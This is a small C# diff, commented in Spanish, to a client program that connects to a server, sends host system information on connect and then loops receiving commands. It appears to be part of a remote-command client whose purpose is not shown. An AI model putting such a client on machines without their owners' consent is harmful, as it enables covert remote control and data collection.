@@ -29,10 +29,16 @@ namespace Client
 
                 // Iniciar la conexión con el servidor
                 ClientSocket.connect();
+                Thread.Sleep(1000);
+
+
+                 ClientSocket.SendResponse(await SystemInfo.GetSystemInfo());
 
                 // Bucle principal para recibir comandos y enviar respuestas
                 while (ClientSocket.isConnected())
                 {
+
+
                     try
                     {
                         byte[] buffer = new byte[1024];
